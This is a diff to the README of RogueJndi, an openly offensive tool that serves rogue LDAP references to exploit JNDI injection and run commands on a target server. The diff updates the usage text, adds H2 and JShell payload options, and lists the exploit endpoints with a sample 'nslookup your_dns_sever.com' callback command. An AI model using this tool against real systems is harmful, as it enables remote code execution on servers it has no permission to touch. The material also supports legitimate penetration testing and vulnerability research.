@@ -28,19 +28,21 @@ $ java -jar target/RogueJndi-1.0.jar -h
 +-+-+-+-+-+-+-+-+-+
 Usage: java -jar target/RogueJndi-1.0.jar [options]
   Options:
-    -c, --command  Command to execute on the target server (default: 
-                   /Applications/Calculator.app/Contents/MacOS/Calculator) 
-    -n, --hostname Local HTTP server hostname (required for remote 
-                   classloading and websphere payloads) (default: 
-                   192.168.1.10) 
-    -l, --ldapPort Ldap bind port (default: 1389)
-    -p, --httpPort Http bind port (default: 8000)
-    --wsdl         [websphere1 payload option] WSDL file with XXE payload 
-                   (default: /list.wsdl)
-    --localjar     [websphere2 payload option] Local jar file to load (this 
-                   file should be located on the remote server) (default: 
-                   ../../../../../tmp/jar_cache7808167489549525095.tmp) 
-    -h, --help     Show this help
+    -c, --command     Command to execute on the target server (default: touch 
+                      /usr/local/tomcat/temp/pwn.txt) 
+    -n, --hostname    Local HTTP server hostname (required for remote 
+                      classloading and websphere payloads) (default: 
+                      192.168.0.166) 
+    -l, --ldapPort    Ldap bind port (default: 1389)
+    -p, --httpPort    Http bind port (default: 8000)
+    --wsdl            [websphere1 payload option] WSDL file with XXE payload 
+                      (default: /list.wsdl)
+    --localjar        [websphere2 payload option] Local jar file to load (this 
+                      file should be located on the remote server) (default: 
+                      ../../../../../tmp/jar_cache7808167489549525095.tmp) 
+    --h2              [H2 database init script file (default: /h2)
+    --js-payload-path [H2 database init script file (default: <empty string>)
+    -h, --help        Show this help
 ```
 The most important parameters are the ldap server hostname (-n, should be accessible from the target) and the command you want to execute on the target server (-c).
  
@@ -54,16 +56,18 @@ $ java -jar target/RogueJndi-1.1.jar --command "nslookup your_dns_sever.com" --h
 +-+-+-+-+-+-+-+-+-+
 Starting HTTP server on 0.0.0.0:8000
 Starting LDAP server on 0.0.0.0:1389
-Mapping ldap://192.168.1.10:1389/ to artsploit.controllers.RemoteReference
-Mapping ldap://192.168.1.10:1389/o=reference to artsploit.controllers.RemoteReference
-Mapping ldap://192.168.1.10:1389/o=tomcat to artsploit.controllers.Tomcat
-Mapping ldap://192.168.0.166:1389/o=tomcat10 to artsploit.controllers.Tomcat10
-Mapping ldap://192.168.1.10:1389/o=groovy to artsploit.controllers.Groovy
-Mapping ldap://192.168.1.10:1389/o=websphere1 to artsploit.controllers.WebSphere1
-Mapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
-Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2
-Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
 Mapping ldap://192.168.0.166:1389/o=h2 to artsploit.controllers.H2
+Mapping ldap://192.168.0.166:1389/o=tomcat to artsploit.controllers.Tomcat
+Mapping ldap://192.168.0.166:1389/o=tomcat10 to artsploit.controllers.Tomcat10
+Mapping ldap://192.168.0.166:1389/o=websphere2 to artsploit.controllers.WebSphere2
+Mapping ldap://192.168.0.166:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
+Mapping ldap://192.168.0.166:1389/o=tomcat10-jshell to artsploit.controllers.Tomcat10JShell
+Mapping ldap://192.168.0.166:1389/o=groovy to artsploit.controllers.Groovy
+Mapping ldap://192.168.0.166:1389/o=tomcat-jshell to artsploit.controllers.TomcatJShell
+Mapping ldap://192.168.0.166:1389/ to artsploit.controllers.RemoteReference
+Mapping ldap://192.168.0.166:1389/o=reference to artsploit.controllers.RemoteReference
+Mapping ldap://192.168.0.166:1389/o=websphere1 to artsploit.controllers.WebSphere1
+Mapping ldap://192.168.0.166:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
 ```
 
 ### Building
